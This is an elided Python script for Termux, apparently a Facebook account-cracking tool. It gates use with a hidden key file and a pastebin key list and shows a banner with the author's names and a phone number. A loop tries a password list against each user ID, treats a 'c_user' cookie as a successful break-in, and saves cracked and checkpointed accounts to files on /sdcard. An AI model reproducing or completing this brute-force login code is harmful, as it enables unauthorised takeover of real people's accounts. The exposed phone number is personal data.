...
def main_apv():
    ...
    try:
        ...
        key1=open('/data/data/com.termux/files/usr/bin/.TGC-cov', 'r').read()
        ...
        kok=open('/data/data/com.termux/files/usr/bin/.TGC-cov', 'w')
    ...
    r1=requests.get("https://pastebin.com/raw/kx4LcMjr").text
...
logo="""
             \033[1;93m88888888888 .d88888b.   .d88888b.  8888888b.   
             \033[1;95m    888    d88P" "Y88b d88P" "Y88b 888   Y88b   
             \033[1;93m    888    888     888 888     888 888    888    
             \033[1;95m    888    888     888 888     888 888   d88P     
             \033[1;93m    888    888     888 888     888 8888888P"       
             \033[1;95m    888    888     888 888     888 888 T88b         
             \033[1;93m    888    Y88b. .d88P Y88b. .d88P 888  T88b         
             \033[1;95m    888     "Y88888P"   "Y88888P"  888   T88b 
        \033[1;92m༄᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MRS           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : SHIPON           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : Shipon           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801773276144       \033[1;93m▇▇
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/NAZIR-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/NAZIR-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : Nazir𝑘ℎ𝑎𝑛")
			print ('\033[1;92m༄᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
			key = input(" [*] Choose : ")
			print ('༄᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[NAZIR]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        open('/sdcard/NAZIR_CP.txt' , 'a').write('%s\n' % wrt)
